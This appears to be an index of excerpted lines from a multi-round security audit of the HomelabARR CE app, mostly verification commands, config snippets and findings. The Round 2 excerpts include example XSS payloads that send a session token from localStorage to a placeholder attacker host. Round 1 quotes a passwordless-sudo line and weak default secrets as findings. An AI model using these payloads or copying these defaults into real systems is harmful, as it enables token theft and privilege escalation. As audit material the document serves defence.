| `docs/audit/R20-secret-material-handling.md` | 1 x | `CODE=$(curl -s https://raw.githubusercontent.com/smashingtags/homelabarr-ce/main/server/auth.js)` |
| `docs/audit/R20-secret-material-handling.md` | 1 x | `DOC=$(curl -s https://raw.githubusercontent.com/smashingtags/homelabarr-ce/main/SECURITY.md)` |
| `docs/audit/R20-secret-material-handling.md` | 1 x | `bash /opt/homelabarr/scripts/rotate-jwt-key.sh` |
| `docs/audit/R20-secret-material-handling.md` | 1 x | `const body = JSON.stringify({ ...safe, source: 'homelabarr-ce', ts: new Date().toISOString() });` |
| `docs/audit/R20-secret-material-handling.md` | 1 x | `curl -s https://raw.githubusercontent.com/smashingtags/homelabarr-ce/main/.eslintrc.json \` |
| `docs/audit/R20-secret-material-handling.md` | 3 x | `curl -s https://raw.githubusercontent.com/smashingtags/homelabarr-ce/main/server/alert.js \` |
| `docs/audit/R20-secret-material-handling.md` | 2 x | `curl -s https://raw.githubusercontent.com/smashingtags/homelabarr-ce/main/server/auth.js \` |
| `docs/audit/R20-secret-material-handling.md` | 1 x | `curl -s https://raw.githubusercontent.com/smashingtags/homelabarr-ce/main/server/db.js \` |
| `docs/audit/R20-secret-material-handling.md` | 1 x | `curl -s https://raw.githubusercontent.com/smashingtags/homelabarr-ce/main/server/index.js \` |
| `docs/audit/R20-secret-material-handling.md` | 1 x | `curl -s https://raw.githubusercontent.com/smashingtags/homelabarr-ce/main/server/secrets.js \` |
| `docs/audit/R20-secret-material-handling.md` | 1 x | `grep key.rotation.detected /var/log/homelabarr/audit.log` |
| `docs/audit/R21-error-surface-hygiene.md` | 1 x | `  COUNT=$(curl -s https://raw.githubusercontent.com/smashingtags/homelabarr-ce/main/$f \| grep -cE 'console\.(log\|error` |
| `docs/audit/R21-error-surface-hygiene.md` | 1 x | `**Live (ce-demo.homelabarr.com, cache-busted, credentials:'omit'):**` |
| `docs/audit/R21-error-surface-hygiene.md` | 1 x | `> **Repo:** smashingtags/homelabarr-ce` |
| `docs/audit/R21-error-surface-hygiene.md` | 1 x | `BASE=https://ce-demo.homelabarr.com` |
| `docs/audit/R21-error-surface-hygiene.md` | 1 x | `Verification: 'curl -X POST -H 'Content-Type: application/json' -d 'not-json' https://ce-demo.homelabarr.com/api/auth/lo` |
| `docs/audit/R21-error-surface-hygiene.md` | 1 x | `curl -s https://raw.githubusercontent.com/smashingtags/homelabarr-ce/main/server/index.js \` |
| `docs/audit/R22-owner-closeout.md` | 1 x | `**Live target:** https://ce-demo.homelabarr.com/` |
| `docs/audit/R22-owner-closeout.md` | 1 x | `**Recommended:** Agent rebuild + redeploy nginx image, then re-probe 'curl -sI https://ce-demo.homelabarr.com/health' an` |
| `docs/audit/R22-owner-closeout.md` | 1 x | `**Recommended:** Block 60 min, read it cold, sign the bottom ('smashingtags, 2026-MM-DD'), commit. If anything in it sur` |
| `docs/audit/R22-owner-closeout.md` | 1 x | `**Recommended:** Hand the agent: "reconcile 'INFRASTRUCTURE.md' against current 'homelabarr.yml' at 'smashingtags/homela` |
| `docs/audit/R22-owner-closeout.md` | 1 x | `**Repo:** smashingtags/homelabarr-ce` |
| `docs/audit/R22-owner-closeout.md` | 1 x | `**What's blocking:** Private repo doc 'deploy-pipeline/INFRASTRUCTURE.md' describes the production compose stack with de` |
| `docs/audit/R22-owner-closeout.md` | 1 x | `- A README with no obvious dead links, a SECURITY.md, CODE_OF_CONDUCT, CONTRIBUTING, an MIT LICENSE, threat model in 'do` |
| `docs/audit/R22-owner-closeout.md` | 1 x | `A prospect arriving today at 'github.com/imogenlabs/homelabarr-ce' will see:` |
| `docs/audit/R22-owner-closeout.md` | 1 x | `After Sprint 1 + Sprint 2 + Sprint 3 ship, every funnel-credibility-blocking item is closed and the homelabarr-ce repo w` |
| `docs/audit/R22-owner-closeout.md` | 1 x | `Live response from 'https://ce-demo.homelabarr.com/health' still returns` |
| `docs/audit/R22-owner-closeout.md` | 1 x | `R21 ("error surface hygiene") was delivered, shipped, and is now verified live. Below is the verification battery result` |
| `docs/audit/R22-owner-closeout.md` | 1 x | `R22 is the **final round** of the 22-round security audit loop on 'homelabarr-ce'. This round does not introduce new fin` |
| `docs/audit/R22-owner-closeout.md` | 1 x | `'curl -sI https://ce-demo.homelabarr.com/health \| grep -i content-type' should show` |
| `docs/audit/R22.5-unauth-route-gating.md` | 1 x | `   window.__HOMELABARR_API_KEY = "<key>";` |
| `docs/audit/R22.5-unauth-route-gating.md` | 1 x | `### §3.1 — Server-side changes ('smashingtags/homelabarr-ce')` |
| `docs/audit/R22.5-unauth-route-gating.md` | 1 x | `### §3.2 — Frontend changes ('smashingtags/homelabarr-ce', React SPA)` |
| `docs/audit/R22.5-unauth-route-gating.md` | 1 x | `### §3.3 — Mobile changes ('smashingtags/homelabarr-mobile')` |
| `docs/audit/R22.5-unauth-route-gating.md` | 1 x | `**Deploy:** ce-demo.homelabarr.com, frontend image 'bdaaa17b6bed', verified live via Playwright` |
| `docs/audit/R22.5-unauth-route-gating.md` | 1 x | `**Live target:** https://ce-demo.homelabarr.com/` |
| `docs/audit/R22.5-unauth-route-gating.md` | 1 x | `**Repo:** smashingtags/homelabarr-ce` |
| `docs/audit/R22.5-unauth-route-gating.md` | 1 x | `1. Open a private/incognito browser window with no 'homelabarr-ce' cookies.` |
| `docs/audit/R22.5-unauth-route-gating.md` | 1 x | `2. Navigate to 'https://ce-demo.homelabarr.com/'.` |
| `docs/audit/R22.5-unauth-route-gating.md` | 1 x | `> Got a domain pointed at your server? Open ports 80 and 443, deploy Traefik from the catalog, and HomelabARR handles th` |
| `docs/audit/R22.5-unauth-route-gating.md` | 1 x | `> Quick start: just IP and port 8084. Want a domain name? Deploy Traefik for SSL, or Traefik + Authelia for 2FA. [Config` |
| `docs/audit/R22.5-unauth-route-gating.md` | 1 x | `> The whole thing. 22 rounds of security audit, threat model, incident response runbook, compliance binders. All in the ` |
| `docs/audit/R22.5-unauth-route-gating.md` | 1 x | `The mobile app ('homelabarr-mobile', public, Expo SDK 55) is a **thin WebView wrapper**. It does not have a native login` |
| `docs/audit/R22.5-unauth-route-gating.md` | 1 x | `The owner is delegating implementation. The agent has code-write access to 'smashingtags/homelabarr-ce' and 'smashingtag` |
| `docs/audit/R22.5-unauth-route-gating.md` | 1 x | `The spec proposed a server-side route guard + API key bootstrap endpoint (§3.1, §3.2, Solution A). After reading the m` |
| `docs/audit/R22.5-unauth-route-gating.md` | 1 x | `Verified by reading 'smashingtags/homelabarr-mobile' 'App.tsx' directly.` |
| `docs/audit/R22.5-unauth-route-gating.md` | 1 x | `\| A1 \| 'curl -sI https://ce-demo.homelabarr.com/' returns '200' with 'Content-Type: text/html', body contains "Sign in` |
| `docs/audit/R22.5-unauth-route-gating.md` | 1 x | `\| A3 \| 'curl -sI 'https://ce-demo.homelabarr.com/?_apikey=<valid-key>'' returns '302' to '/' with a 'Set-Cookie' for t` |
| `docs/audit/R22.5-unauth-route-gating.md` | 1 x | `\| A5 \| 'curl -sI 'http://ce-demo.homelabarr.com/?_apikey=<any>'' (HTTP, not HTTPS) returns '400' and does not attempt ` |
| `docs/audit/R9.7-A-container-stale.md` | 1 x | `BASE=https://ce-demo.homelabarr.com` |
| `docs/audit/R9.7-A-container-stale.md` | 1 x | `Service name is probably 'backend' or 'homelabarr-backend' — adjust to whatever 'docker compose ps' shows.` |
| `docs/audit/R9.7-A-container-stale.md` | 1 x | `cd /path/to/homelabarr-ce` |
| `docs/audit/R9.7-B-image-not-from-main.md` | 1 x | `  https://ce-demo.homelabarr.com/api/internal/audit` |
| `docs/audit/R9.7-B-image-not-from-main.md` | 1 x | `BASE=https://ce-demo.homelabarr.com` |
| `docs/audit/R9.7-B-image-not-from-main.md` | 1 x | `cd /path/to/homelabarr-ce` |
| `docs/audit/R9.7-B-image-not-from-main.md` | 1 x | `docker images \| grep homelabarr \| head` |
| `docs/audit/R9.7-B-image-not-from-main.md` | 1 x | `docker rmi $(docker images -q 'homelabarr*')` |
| `docs/audit/R9.7-DEPLOY-BRANCH-DRIFT.md` | 1 x | `### Live state (verified just now, cache-busted, ce-demo.homelabarr.com)` |
| `docs/audit/R9.7-DEPLOY-BRANCH-DRIFT.md` | 1 x | `BASE=https://ce-demo.homelabarr.com` |
| `docs/audit/R9.7-DEPLOY-BRANCH-DRIFT.md` | 1 x | `Post-merge verification (run on ce-demo.homelabarr.com):` |
| `docs/audit/R9.7-DEPLOY-BRANCH-DRIFT.md` | 1 x | `curl -s https://ce-demo.homelabarr.com/api/health \| jq .ts` |
| `docs/audit/R9.7-DEPLOY-BRANCH-DRIFT.md` | 1 x | `curl -sI https://ce-demo.homelabarr.com/api/_routes \| head -1` |
| `docs/audit/R9.7-DEPLOY-BRANCH-DRIFT.md` | 1 x | `curl -sI https://ce-demo.homelabarr.com/api/health/detail \| head -1` |
| `docs/audit/homelabarr-ce-Round-1-security-audit.md` | 1 x | `    adduser -u 1001 -G homelabarr -s /bin/bash -D homelabarr` |
| `docs/audit/homelabarr-ce-Round-1-security-audit.md` | 1 x | `    adduser -u 1001 -G homelabarr -s /bin/bash -D homelabarr && \` |
| `docs/audit/homelabarr-ce-Round-1-security-audit.md` | 1 x | `    echo 'homelabarr ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers` |
| `docs/audit/homelabarr-ce-Round-1-security-audit.md` | 1 x | `### L-31. SECURITY.md and 'homelabarr.yml' disagree on socket mount mode` |
| `docs/audit/homelabarr-ce-Round-1-security-audit.md` | 1 x | `**Impact:** Combined with C-1 and C-8 (no login throttling), an internet-exposed instance using stock 'homelabarr.yml' f` |
| `docs/audit/homelabarr-ce-Round-1-security-audit.md` | 1 x | `**Impact:** Plaintext key storage = anyone with read access to the 'homelabarr-config' volume gets every API key in clea` |
| `docs/audit/homelabarr-ce-Round-1-security-audit.md` | 1 x | `**Live target:** 'https://ce-demo.homelabarr.com/' (Cloudflare-fronted)` |
| `docs/audit/homelabarr-ce-Round-1-security-audit.md` | 1 x | `**Project:** HomelabARR CE ('smashingtags/homelabarr-ce')` |
| `docs/audit/homelabarr-ce-Round-1-security-audit.md` | 1 x | `**Where:** SECURITY.md L53 ("':ro' where possible") vs 'homelabarr.yml' L68 (':rw')` |
| `docs/audit/homelabarr-ce-Round-1-security-audit.md` | 1 x | `**Where:** 'Dockerfile' (frontend) — creates 'homelabarr:1001' user, chowns dirs, but final stage has no 'USER homelab` |
| `docs/audit/homelabarr-ce-Round-1-security-audit.md` | 1 x | `**Where:** 'homelabarr.yml' L59, README install script, 'auth.js' initialization` |
| `docs/audit/homelabarr-ce-Round-1-security-audit.md` | 1 x | `**Where:** 'homelabarr.yml' L68` |
| `docs/audit/homelabarr-ce-Round-1-security-audit.md` | 1 x | `**Where:** 'homelabarr.yml' L87` |
| `docs/audit/homelabarr-ce-Round-1-security-audit.md` | 1 x | `**Where:** 'homelabarr.yml' — neither service has hardening directives.` |
| `docs/audit/homelabarr-ce-Round-1-security-audit.md` | 1 x | `- **Decide:** Ship socket-proxy as default in 'homelabarr.yml' (recommended), or keep current behavior and rewrite SECUR` |
| `docs/audit/homelabarr-ce-Round-1-security-audit.md` | 1 x | `- 'Dockerfile.backend' — 'USER homelabarr' ✓ but 'homelabarr ALL=(ALL) NOPASSWD: ALL' in '/etc/sudoers'` |
| `docs/audit/homelabarr-ce-Round-1-security-audit.md` | 1 x | `- 'docker exec homelabarr-backend cat /etc/sudoers \| grep homelabarr' returns nothing` |
| `docs/audit/homelabarr-ce-Round-1-security-audit.md` | 1 x | `- 'docker exec homelabarr-backend env \| grep -i jwt_secret' shows a non-default value` |
| `docs/audit/homelabarr-ce-Round-1-security-audit.md` | 1 x | `- 'docker exec homelabarr-backend ls -la /var/run/docker.sock' shows expected GID` |
| `docs/audit/homelabarr-ce-Round-1-security-audit.md` | 1 x | `- 'homelabarr.yml' — 'JWT_SECRET=...:-CHANGE-THIS-TO-A-SECURE-SECRET', 'DEFAULT_ADMIN_PASSWORD=...:-admin', '/var/run/` |
| `docs/audit/homelabarr-ce-Round-1-security-audit.md` | 1 x | `1. **Recommended:** Put a [docker-socket-proxy](https://github.com/Tecnativa/docker-socket-proxy) sidecar in 'homelabarr` |
| `docs/audit/homelabarr-ce-Round-1-security-audit.md` | 1 x | `1. Remove the ':-admin' default from 'homelabarr.yml'. Make 'DEFAULT_ADMIN_PASSWORD' required, fail-closed.` |
| `docs/audit/homelabarr-ce-Round-1-security-audit.md` | 1 x | `After Rounds 2–N ship, run this from a browser console on 'https://ce-demo.homelabarr.com/':` |
| `docs/audit/homelabarr-ce-Round-1-security-audit.md` | 1 x | `Or better: remove the 'ports' block entirely and let the frontend container reach the backend over the internal 'homelab` |
| `docs/audit/homelabarr-ce-Round-1-security-audit.md` | 2 x | `RUN addgroup -g 1001 homelabarr && \` |
| `docs/audit/homelabarr-ce-Round-1-security-audit.md` | 1 x | `USER homelabarr` |
| `docs/audit/homelabarr-ce-Round-1-security-audit.md` | 1 x | `Verified live on 'ce-demo.homelabarr.com' and against 'main' @ 'aa968c3' on 2026-05-22.` |
| `docs/audit/homelabarr-ce-Round-1-security-audit.md` | 1 x | `jwtSecret: process.env.JWT_SECRET \|\| 'homelabarr-default-secret-change-in-production',` |
| `docs/audit/homelabarr-ce-Round-2-5-correction-audit.md` | 1 x | `    r.bundle_no_homelabarr_token = !js.includes('homelabarr_token');` |
| `docs/audit/homelabarr-ce-Round-2-5-correction-audit.md` | 1 x | `  Object.keys(localStorage).filter(k => /^homelabarr_(token\|user\|jwt)$/i.test(k)).forEach(k => localStorage.removeItem` |
| `docs/audit/homelabarr-ce-Round-2-5-correction-audit.md` | 1 x | `  Removes ALL localStorage.{get,set,remove}Item references to 'homelabarr_token'.` |
| `docs/audit/homelabarr-ce-Round-2-5-correction-audit.md` | 2 x | `  const token = localStorage.getItem('homelabarr_token');` |
| `docs/audit/homelabarr-ce-Round-2-5-correction-audit.md` | 1 x | `  localStorage.removeItem('homelabarr_token');` |
| `docs/audit/homelabarr-ce-Round-2-5-correction-audit.md` | 1 x | `**Impact:** Defense-in-depth. Even after the client migrates, a stale browser tab from before deploy still has localStor` |
| `docs/audit/homelabarr-ce-Round-2-5-correction-audit.md` | 1 x | `**Target (live):** https://ce-demo.homelabarr.com/` |
| `docs/audit/homelabarr-ce-Round-2-5-correction-audit.md` | 1 x | `**Target (repo):** https://github.com/imogenlabs/homelabarr-ce` |
| `docs/audit/homelabarr-ce-Round-2-5-correction-audit.md` | 1 x | `- Frontend client no longer reads or writes localStorage.homelabarr_token.` |
| `docs/audit/homelabarr-ce-Round-2-5-correction-audit.md` | 1 x | `- 'bundle_no_homelabarr_token' — built bundle has no ''homelabarr_token'' string` |
| `docs/audit/homelabarr-ce-Round-2-5-correction-audit.md` | 1 x | `// Paste in DevTools console on https://ce-demo.homelabarr.com/?_v=r25verify after deploy.` |
| `docs/audit/homelabarr-ce-Round-2-5-correction-audit.md` | 1 x | `1. Storing the JWT in 'localStorage.homelabarr_token' after login` |
| `docs/audit/homelabarr-ce-Round-2-5-correction-audit.md` | 1 x | `Ran the §4 matrix against 'ce-demo.homelabarr.com/?_v=r2verify' with cache-busting. **9 of 11 pass, 1 critical fail, 1 ` |
| `docs/audit/homelabarr-ce-Round-2-5-correction-audit.md` | 1 x | `Verification: §4 of round-2-5 audit MD must pass on ce-demo.homelabarr.com.` |
| `docs/audit/homelabarr-ce-Round-2-5-correction-audit.md` | 1 x | `const TOKEN_KEY = 'homelabarr_token';` |
| `docs/audit/homelabarr-ce-Round-2-5-correction-audit.md` | 1 x | `curl -s https://ce-demo.homelabarr.com/ \| grep -i mjashley` |
| `docs/audit/homelabarr-ce-Round-2-5-correction-audit.md` | 1 x | `grep -nE 'getAuthHeader\|Authorization\|Bearer\|homelabarr_token' src/` |
| `docs/audit/homelabarr-ce-Round-2-5-correction-audit.md` | 1 x | `localStorage.getItem('homelabarr_token')` |
| `docs/audit/homelabarr-ce-Round-2-5-correction-audit.md` | 1 x | `localStorage.removeItem('homelabarr_token')` |
| `docs/audit/homelabarr-ce-Round-2-5-correction-audit.md` | 1 x | `localStorage.setItem('homelabarr_token', ...)` |
| `docs/audit/homelabarr-ce-Round-2-5-correction-audit.md` | 1 x | `\| **'no_jwt_in_localstorage'** \| **true** \| **FALSE — 'homelabarr_token' still written by frontend AuthContext on l` |
| `docs/audit/homelabarr-ce-Round-2-security-audit.md` | 1 x | `**Target (live):** https://ce-demo.homelabarr.com/` |
| `docs/audit/homelabarr-ce-Round-2-security-audit.md` | 1 x | `**Target (repo):** https://github.com/imogenlabs/homelabarr-ce` |
| `docs/audit/homelabarr-ce-Round-2-security-audit.md` | 1 x | `- All charcode-decoded source spot-checks were re-verified against 'https://github.com/imogenlabs/homelabarr-ce/blob/mai` |
| `docs/audit/homelabarr-ce-Round-2-security-audit.md` | 1 x | `- container Labels ('homelabarr.url', etc.) are not yet a source but are a reasonable future feature` |
| `docs/audit/homelabarr-ce-Round-2-security-audit.md` | 1 x | `// Expected: ['https://ce-demo.homelabarr.com/analytics.js']` |
| `docs/audit/homelabarr-ce-Round-2-security-audit.md` | 1 x | `// Paste into DevTools console on https://ce-demo.homelabarr.com/?_v=r2verify` |
| `docs/audit/homelabarr-ce-Round-2-security-audit.md` | 1 x | `1. **HSTS preload submission** — submit 'homelabarr.com' (root) to https://hstspreload.org/ once HSTS header satisfies` |
| `docs/audit/homelabarr-ce-Round-2-security-audit.md` | 1 x | `Live CSP on 'ce-demo.homelabarr.com/' (verified via fetch, cache:'reload'):` |
| `docs/audit/homelabarr-ce-Round-2-security-audit.md` | 1 x | `Re-ran Round 1 verification matrix against ce-demo.homelabarr.com with cache-busting:` |
| `docs/audit/homelabarr-ce-Round-2-security-audit.md` | 1 x | `Then submit 'homelabarr.com' to https://hstspreload.org/ (manual; owner pile §6).` |
| `docs/audit/homelabarr-ce-Round-2-security-audit.md` | 1 x | `Verification: §4 of round-2 audit MD must pass all assertions on ce-demo.homelabarr.com.` |
| `docs/audit/homelabarr-ce-Round-2-security-audit.md` | 1 x | `add_header Content-Security-Policy "default-src 'self'; base-uri 'self'; form-action 'self'; frame-ancestors 'none'; img` |
| `docs/audit/homelabarr-ce-Round-2-security-audit.md` | 1 x | `const TOKEN_KEY = 'homelabarr_token';` |
| `docs/audit/homelabarr-ce-Round-2-security-audit.md` | 1 x | `curl -sI https://ce-demo.homelabarr.com/ \| grep -i content-security-policy` |
| `docs/audit/homelabarr-ce-Round-2-security-audit.md` | 1 x | `curl -sI https://ce-demo.homelabarr.com/ \| grep -i strict-transport-security` |
| `docs/audit/homelabarr-ce-Round-2-security-audit.md` | 1 x | `curl -sI https://ce-demo.homelabarr.com/ \| grep -iE 'reporting-endpoints\|report-to\|report-uri'` |
| `docs/audit/homelabarr-ce-Round-2-security-audit.md` | 1 x | `fetch('//attacker/?t=' + localStorage.getItem('homelabarr_token'))` |
| `docs/audit/homelabarr-ce-Round-2-security-audit.md` | 1 x | `localStorage.getItem('homelabarr_token')  // must be null` |
| `docs/audit/homelabarr-ce-Round-2-security-audit.md` | 1 x | `new Image().src = '//attacker/?t=' + (localStorage.getItem('homelabarr_token') \|\| 'NONE')` |
| `docs/audit/homelabarr-ce-Round-2-security-audit.md` | 1 x | `\| 'src/App.tsx:873,876,877,878' \| static 'href="https://imogenlabs.ai\|wiki.homelabarr.com\|discord.gg/Pc7mXX786x\|git` |
| `docs/audit/homelabarr-ce-Round-3-security-audit.md` | 1 x | `        from: process.env.SMTP_FROM \|\| 'homelabarr@localhost',` |
| `docs/audit/homelabarr-ce-Round-3-security-audit.md` | 1 x | `      from: process.env.SMTP_FROM \|\| 'homelabarr@localhost',` |
| `docs/audit/homelabarr-ce-Round-3-security-audit.md` | 1 x | `**Demo-mode behavior:** if 'SMTP_HOST' is not set (the case for ce-demo.homelabarr.com), 'forgot-password' returns 204 i` |
| `docs/audit/homelabarr-ce-Round-3-security-audit.md` | 1 x | `**Target (live):** https://ce-demo.homelabarr.com/` |
| `docs/audit/homelabarr-ce-Round-3-security-audit.md` | 1 x | `**Target (repo):** https://github.com/imogenlabs/homelabarr-ce` |
| `docs/audit/homelabarr-ce-Round-3-security-audit.md` | 1 x | `// Paste into DevTools on https://ce-demo.homelabarr.com/?_v=r3verify after R3 deploys.` |
| `docs/audit/homelabarr-ce-Round-3-security-audit.md` | 1 x | `Re-ran the R2.5 §4 matrix against 'ce-demo.homelabarr.com/?_v=r25verify' with cache-busting.` |
| `docs/audit/homelabarr-ce-Round-3-security-audit.md` | 1 x | `Verification: §4 of round-3 audit MD must pass on ce-demo.homelabarr.com.` |
| `docs/audit/homelabarr-ce-Round-3-security-audit.md` | 1 x | `curl -i --cookie 'hl_session=...; hl_csrf=...' -H 'X-CSRF-Token: ...' -H 'X-Requested-With: XMLHttpRequest' https://ce-d` |
| `docs/audit/homelabarr-ce-Round-3-security-audit.md` | 1 x | `curl -i -XPOST https://ce-demo.homelabarr.com/api/auth/login -H 'Content-Type: application/json' -H 'X-Requested-With: X` |
| `docs/audit/homelabarr-ce-Round-3-security-audit.md` | 1 x | `curl -i -XPOST https://ce-demo.homelabarr.com/api/auth/mfa/setup -H 'Cookie: hl_session=...' -H 'X-Requested-With: XMLHt` |
| `docs/audit/homelabarr-ce-Round-3-security-audit.md` | 1 x | `\| Bundle 'homelabarr_token' count \| 1 (one-shot wipe per spec) \| exactly 1 \| ✅ \|` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 1 x | `            ghcr.io/${{ github.repository_owner }}/homelabarr-backend@${{ steps.build.outputs.digest }}` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 1 x | `          image-ref: ghcr.io/${{ github.repository_owner }}/homelabarr-backend@${{ steps.build.outputs.digest }}` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 1 x | `      - ${CLI_BRIDGE_HOST_PATH:-/opt/homelabarr}:/homelabarr:ro   # was :rw — see H-R4-3` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 1 x | `      - homelabarr           # public-facing (Traefik)` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 1 x | `      - homelabarr-activity:/app/server/activity-data` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 1 x | `      - homelabarr-config:/app/server/config` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 1 x | `      - homelabarr-data:/app/data` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 1 x | `      - homelabarr-internal` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 1 x | `      - homelabarr-internal  # talks to socket-proxy` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 1 x | `      --certificate-identity-regexp '^https://github.com/imogenlabs/homelabarr-ce/' \` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 1 x | `      ghcr.io/imogenlabs/homelabarr-backend:<version>` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 1 x | `    # NOT on the public 'homelabarr' net — only backend can reach it` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 1 x | `    - ${CLI_BRIDGE_HOST_PATH:-/opt/homelabarr}:/homelabarr:rw` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 1 x | `    - homelabarr-activity:/app/server/activity-data` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 1 x | `    - homelabarr-config:/app/server/config` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 1 x | `    - homelabarr-data:/app/data` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 1 x | `    container_name: homelabarr-socket-proxy` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 1 x | `    image: ghcr.io/imogenlabs/homelabarr-backend:latest` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 1 x | `    name: homelabarr` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 1 x | `    name: homelabarr-internal` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 1 x | `  - ${CLI_BRIDGE_HOST_PATH:-/opt/homelabarr}:/homelabarr:ro` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 1 x | `  - ${CLI_BRIDGE_WORKDIR:-/var/lib/homelabarr/work}:/homelabarr/work:rw` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 2 x | `  --certificate-identity-regexp '^https://github.com/imogenlabs/homelabarr-ce/' \` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 1 x | `  container_name: homelabarr-backend` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 1 x | `  ghcr.io/imogenlabs/homelabarr-backend:<tag>` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 1 x | `  ghcr.io/imogenlabs/homelabarr-backend:latest` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 1 x | `  homelabarr-internal:` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 1 x | `  homelabarr:` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 1 x | `  http://socket-proxy:2375/v1.41/containers/homelabarr-backend/exec` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 1 x | `  http://socket-proxy:2375/v1.41/containers/homelabarr-backend/exec 2>&1 \| head -5` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 3 x | `  image: ghcr.io/imogenlabs/homelabarr-backend:latest` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 1 x | `# Logged-in browser session (DevTools console on ce-demo.homelabarr.com):` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 1 x | `### 2.1 — 'homelabarr.yml' (production compose, GHCR images)` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 1 x | `### H-R4-3 — Backend has read-write bind mount to host '/opt/homelabarr' (CLI bridge)` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 1 x | `### Round 3 verification matrix (against 'ce-demo.homelabarr.com/?_v=r3verify', post-deploy bundle 'index-pjntRCiX.js')` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 1 x | `**Target:** 'smashingtags/homelabarr-ce' @ main (verified live: ce-demo.homelabarr.com, bundle 'index-pjntRCiX.js')` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 1 x | `**WRONG — current 'homelabarr.yml' backend service**` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 1 x | `**What:** A user who follows the README quickstart never learns they should 'cosign verify' images, override 'JWT_SECRET` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 1 x | `**What:** The backend can rewrite any file under the host's HomelabARR installation directory, including the CLI scripts` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 1 x | `**Where:** 'homelabarr.yml' line '- DEFAULT_ADMIN_PASSWORD=${DEFAULT_ADMIN_PASSWORD:-admin}'` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 1 x | `**Where:** 'homelabarr.yml' line '- JWT_EXPIRES_IN=${JWT_EXPIRES_IN:-24h}'` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 1 x | `**Where:** 'homelabarr.yml' line '- JWT_SECRET=${JWT_SECRET:-CHANGE-THIS-TO-A-SECURE-SECRET}'` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 1 x | `**Where:** 'homelabarr.yml' — 'image: ghcr.io/imogenlabs/homelabarr-frontend:latest' and similarly for backend` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 1 x | `**Where:** 'homelabarr.yml' — all three services (frontend, backend, and the proxy from C-R4-1)` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 1 x | `**Where:** 'homelabarr.yml' — both 'frontend' and 'backend' services` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 1 x | `**Where:** 'homelabarr.yml' → 'backend.volumes' line '${CLI_BRIDGE_HOST_PATH:-/opt/homelabarr}:/homelabarr:rw'` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 1 x | `**Where:** 'homelabarr.yml' → 'backend.volumes' line '- /var/run/docker.sock:/var/run/docker.sock:rw' + 'backend.group` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 1 x | `**Where:** 'homelabarr.yml' → 'backend' service block` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 1 x | `- ${CLI_BRIDGE_HOST_PATH:-/opt/homelabarr}:/homelabarr:rw` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 1 x | `- [ ] 'docker inspect homelabarr-backend' shows 'ReadonlyRootfs: true' and 'CapDrop: [ALL]'.` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 1 x | `- 'docker inspect' on 'homelabarr-backend' and 'homelabarr-frontend' (via your relay if you want me to script it),` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 1 x | `- 'grep '@sha256:' homelabarr.yml' shows three pinned digests,` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 1 x | `> **Note on 'read_only: true' + persistent state:** The three named volumes ('homelabarr-data', 'homelabarr-config', 'ho` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 1 x | `Already does the right things image-side: 'USER homelabarr' (uid 1001), 'apk upgrade --no-cache' for current Alpine CVEs` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 1 x | `And in 'homelabarr.yml' frontend service block:` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 1 x | `GET https://ce-demo.homelabarr.com/  → 200, served via Traefik ('server: nginx' proxy)` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 1 x | `GET https://ce-demo.homelabarr.com/api/health  → 200` |
